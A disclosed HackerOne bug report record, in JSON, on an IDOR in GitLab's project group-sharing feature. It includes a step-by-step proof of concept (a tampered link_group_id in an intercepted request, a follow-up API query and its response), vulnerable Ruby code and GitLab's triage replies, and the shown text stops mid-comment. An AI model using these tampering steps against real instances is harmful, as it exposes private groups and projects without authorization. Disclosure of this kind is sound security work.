{"id":131210,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzEyMTA=","url":"https://hackerone.com/reports/131210","title":"Privilege escalation to access all private groups and repositories","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-15T21:35:59.960Z","submitted_at":"2016-04-15T21:35:59.960Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-07-27T19:48:27.940Z","bug_reporter_agreed_on_going_public_at":"2016-06-27T19:48:20.278Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Vulnerability details\nThere is an insecure direct object reference (IDOR) issue in the group sharing feature for a project. This allows an attacker to get access to the names of private repositories of a group, issues, milestones, and the group its team members.\n\n# Proof of concept\nFirst, lets set up the private group. Go to http://gitlab-instance/groups/new and fill in a name and set its visibility to private. In this example, lets call the group `private-group`. Lets also create a new project in the group at http://gitlab-instance/projects/new?namespace_id=7. The ID in the URL changes depending on the ID of the group that was just created. Lets call the project `secret-project`. Memorize this ID, you need it later in the PoC.\n\nNow to get access to the group without being a member, sign in as some user (`jane`), create a new project and call it `dummy-project`. If Jane now goes to http://gitlab-instance/groups/private-group, a 404 is shown. This is good. Now go to http://gitlab-instance/jane/dummy-project/group_links. Now select a random public group from the dropdown list. Before clicking on the \"Share\" button , make sure you intercept your network traffic. The request that is being sent to the server will look something like this:\n\n```\nPOST /jane/dummy-group/group_links HTTP/1.1\nHost: 159.xxx.xxx.xxx\n...\n\nutf8=%E2%9C%93\u0026authenticity_token=LKWaV6ekT0zFbfFJPKRG78OyIsUvCxObht2Dn1l7p02SEa9IrefoAtdtwX%2F890lUqS2HLCtASPQyvFWmCYtJwA%3D%3D\u0026link_group_id=6\u0026link_group_access=40\n```\n\nNow change the `link_group_id` in this request to the ID that you memorized in the first paragraph of this section and forward the request. Your page will now show the name of the private group. If Jane now goes to http://gitlab-instance/groups/private-group, to secret group page is shown. At this point, the private repositories are still hidden.\n\nSince the attacker has read access to the group now, there are some endpoints that leak some private information. By sending a request to the http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL\u0026search=\u0026per_page=20 endpoint with Jane's API token, the private repositories are leaked. Here's an example response:\n\n```json\n[\n  {\n    \"id\":11,\n    \"description\":\"Super secret description of this project.\",\n    \"default_branch\":null,\n    \"tag_list\":[],\n    \"public\":false,\n    \"archived\":false,\n    \"visibility_level\":0,\n    \"ssh_url_to_repo\":\"git@gitlab-instance:super-private/secret-project.git\",\n    \"http_url_to_repo\":\"http://gitlab-instance/super-private/secret-project.git\",\n    \"web_url\":\"http://gitlab-instance/super-private/secret-project\",\n    \"name\":\"secret-project\",\n    \"name_with_namespace\":\"super-private / secret-project\",\n    \"path\":\"secret-project\",\n    \"path_with_namespace\":\"super-private/secret-project\",\n    \"issues_enabled\":true,\n    \"merge_requests_enabled\":true,\n    \"wiki_enabled\":true,\n    \"builds_enabled\":true,\n    \"snippets_enabled\":false,\n    \"created_at\":\"2016-04-15T20:55:19.228Z\",\n    \"last_activity_at\":\"2016-04-15T20:56:24.988Z\",\n    \"shared_runners_enabled\":true,\n    \"creator_id\":1,\n    \"namespace\":{\n      \"id\":7,\n      \"name\":\"super-private\",\n      \"path\":\"super-private\",\n      \"owner_id\":null,\n      \"created_at\":\"2016-04-15T20:42:01.718Z\",\n      \"updated_at\":\"2016-04-15T20:42:01.718Z\",\n      \"description\":\"Super private group.\",\n      \"avatar\":\n      {\n        \"url\":null\n      },\n      \"share_with_group_lock\":false,\n      \"visibility_level\":0\n    },\n    \"avatar_url\":null,\n    \"star_count\":0,\n    \"forks_count\":0,\n    \"open_issues_count\":1,\n    \"public_builds\":true\n  }\n]\n```\n\nThe repository itself can't be accessed, but there's definitely some information disclosed that the attacker shouldn't have access to. In a real world scenario, someone could iterate over all namespace IDs and get access to all private groups. From there, it could send a request to the GitLab API to gain more knowledge about the private projects.\n\n# Fix\nThis can be fixed by restricting which groups can be added to a project by a user. The issue itself originates from line 11 of the `Projects::GroupLinksController`, which can be found at `app/controllers/projects/group_links_controller.rb`.","vulnerability_information_html":"\u003ch1 id=\"vulnerability-details\"\u003eVulnerability details\u003c/h1\u003e\n\n\u003cp\u003eThere is an insecure direct object reference (IDOR) issue in the group sharing feature for a project. This allows an attacker to get access to the names of private repositories of a group, issues, milestones, and the group its team members.\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of concept\u003c/h1\u003e\n\n\u003cp\u003eFirst, lets set up the private group. Go to \u003ca title=\"http://gitlab-instance/groups/new\" href=\"/redirect?url=http%3A%2F%2Fgitlab-instance%2Fgroups%2Fnew\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-instance/groups/new\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and fill in a name and set its visibility to private. In this example, lets call the group \u003ccode\u003eprivate-group\u003c/code\u003e. Lets also create a new project in the group at \u003ca title=\"http://gitlab-instance/projects/new?namespace_id=7\" href=\"/redirect?url=http%3A%2F%2Fgitlab-instance%2Fprojects%2Fnew%3Fnamespace_id%3D7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-instance/projects/new?namespace_id=7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The ID in the URL changes depending on the ID of the group that was just created. Lets call the project \u003ccode\u003esecret-project\u003c/code\u003e. Memorize this ID, you need it later in the PoC.\u003c/p\u003e\n\n\u003cp\u003eNow to get access to the group without being a member, sign in as some user (\u003ccode\u003ejane\u003c/code\u003e), create a new project and call it \u003ccode\u003edummy-project\u003c/code\u003e. If Jane now goes to \u003ca title=\"http://gitlab-instance/groups/private-group\" href=\"/redirect?url=http%3A%2F%2Fgitlab-instance%2Fgroups%2Fprivate-group\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-instance/groups/private-group\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, a 404 is shown. This is good. Now go to \u003ca title=\"http://gitlab-instance/jane/dummy-project/group_links\" href=\"/redirect?url=http%3A%2F%2Fgitlab-instance%2Fjane%2Fdummy-project%2Fgroup_links\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-instance/jane/dummy-project/group_links\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Now select a random public group from the dropdown list. Before clicking on the \u0026quot;Share\u0026quot; button , make sure you intercept your network traffic. The request that is being sent to the server will look something like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /jane/dummy-group/group_links HTTP/1.1\nHost: 159.xxx.xxx.xxx\n...\n\nutf8=%E2%9C%93\u0026amp;authenticity_token=LKWaV6ekT0zFbfFJPKRG78OyIsUvCxObht2Dn1l7p02SEa9IrefoAtdtwX%2F890lUqS2HLCtASPQyvFWmCYtJwA%3D%3D\u0026amp;link_group_id=6\u0026amp;link_group_access=40\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow change the \u003ccode\u003elink_group_id\u003c/code\u003e in this request to the ID that you memorized in the first paragraph of this section and forward the request. Your page will now show the name of the private group. If Jane now goes to \u003ca title=\"http://gitlab-instance/groups/private-group\" href=\"/redirect?url=http%3A%2F%2Fgitlab-instance%2Fgroups%2Fprivate-group\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-instance/groups/private-group\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, to secret group page is shown. At this point, the private repositories are still hidden.\u003c/p\u003e\n\n\u003cp\u003eSince the attacker has read access to the group now, there are some endpoints that leak some private information. By sending a request to the \u003ca title=\"http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL\u0026amp;search=\u0026amp;per_page=20\" href=\"/redirect?url=http%3A%2F%2Fgitlab-instance%2Fapi%2Fv3%2Fgroups%2F7%2Fprojects.json%3Fprivate_token%3DZJirZUgh9QGSQfaGBHDL%26search%3D%26per_page%3D20\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL\u0026amp;search=\u0026amp;per_page=20\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e endpoint with Jane\u0026#39;s API token, the private repositories are leaked. Here\u0026#39;s an example response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Super secret description of this project.\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;default_branch\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;tag_list\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[],\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;public\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;archived\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;visibility_level\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;ssh_url_to_repo\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;git@gitlab-instance:super-private/secret-project.git\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;http_url_to_repo\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;http://gitlab-instance/super-private/secret-project.git\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;web_url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;http://gitlab-instance/super-private/secret-project\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;secret-project\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name_with_namespace\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;super-private / secret-project\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;path\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;secret-project\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;path_with_namespace\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;super-private/secret-project\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;issues_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;merge_requests_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;wiki_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;builds_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;snippets_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;created_at\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2016-04-15T20:55:19.228Z\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;last_activity_at\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2016-04-15T20:56:24.988Z\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;shared_runners_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;creator_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;namespace\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;super-private\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;path\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;super-private\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;owner_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;created_at\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2016-04-15T20:42:01.718Z\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;updated_at\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2016-04-15T20:42:01.718Z\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Super private group.\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;avatar\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n        \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;share_with_group_lock\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;visibility_level\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;avatar_url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;star_count\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;forks_count\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;open_issues_count\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;public_builds\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe repository itself can\u0026#39;t be accessed, but there\u0026#39;s definitely some information disclosed that the attacker shouldn\u0026#39;t have access to. In a real world scenario, someone could iterate over all namespace IDs and get access to all private groups. From there, it could send a request to the GitLab API to gain more knowledge about the private projects.\u003c/p\u003e\n\n\u003ch1 id=\"fix\"\u003eFix\u003c/h1\u003e\n\n\u003cp\u003eThis can be fixed by restricting which groups can be added to a project by a user. The issue itself originates from line 11 of the \u003ccode\u003eProjects::GroupLinksController\u003c/code\u003e, which can be found at \u003ccode\u003eapp/controllers/projects/group_links_controller.rb\u003c/code\u003e.\u003c/p\u003e\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-07-27T19:48:20.438Z","allow_singular_disclosure_after":-139566999.19118762,"singular_disclosure_allowed":true,"vote_count":15,"voters":["shailesh4594","yaworsk","mdv","eveeez","sumit7","secdoor","spetr0x","3p1c","dyabla","cryptosector","and 5 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":911211,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Jobert,\n\nThank you for reporting. The issue has been published for our team to evaluate. I'll report back shortly. Feel free to get in touch through security@gitlab.com for any follow up required.\n\nBest regards,\n\nJosé Torres\nGitLab B.V.","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eThank you for reporting. The issue has been published for our team to evaluate. I\u0026#39;ll report back shortly. Feel free to get in touch through \u003ca title=\"security@gitlab.com\" href=\"mailto:security@gitlab.com\" rel=\"nofollow noopener noreferrer\"\u003esecurity@gitlab.com\u003c/a\u003e for any follow up required.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003c/p\u003e\n\n\u003cp\u003eJosé Torres\u003cbr\u003e\nGitLab B.V.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-18T07:57:25.791Z","updated_at":"2016-04-18T07:57:25.791Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":915736,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nJust wanted to let you know that the fix has been scheduled for GitLab 8.7 to be released April 22nd. I'll report back with merge request for you to confirm.\n\nBest regards,\n\nJosé Torres\nGitLab B.V.","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eJust wanted to let you know that the fix has been scheduled for GitLab 8.7 to be released April 22nd. I\u0026#39;ll report back with merge request for you to confirm.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003c/p\u003e\n\n\u003cp\u003eJosé Torres\u003cbr\u003e\nGitLab B.V.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-19T19:51:19.609Z","updated_at":"2016-04-19T19:51:19.609Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":916454,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi José,\n\nThat sounds great, thanks. One thing I noticed today is that this issue also seems to exist in the API. When a `POST` request is sent to `/projects/:id/share`, the project can be shared with a group. Here's an excerpt of the code that is executed (`lib/api/projects.rb:310-313`):\n\n```ruby\nlink = user_project.project_group_links.new\nlink.group_id = params[:group_id]\nlink.group_access = params[:group_access]\nif link.save\n```\n\nThe first three lines are almost exactly the same code as used in the `Projects::GroupLinksController`. When `save` is called, the admin of the project gets read access to that group identified by `params[:group_id]`, resulting in the same issue as described in the initial report. Let me know if you have any questions!","markdown_message":"\u003cp\u003eHi José,\u003c/p\u003e\n\n\u003cp\u003eThat sounds great, thanks. One thing I noticed today is that this issue also seems to exist in the API. When a \u003ccode\u003ePOST\u003c/code\u003e request is sent to \u003ccode\u003e/projects/:id/share\u003c/code\u003e, the project can be shared with a group. Here\u0026#39;s an excerpt of the code that is executed (\u003ccode\u003elib/api/projects.rb:310-313\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003elink\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euser_project\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eproject_group_links\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\n\u003cspan class=\"n\"\u003elink\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egroup_id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan 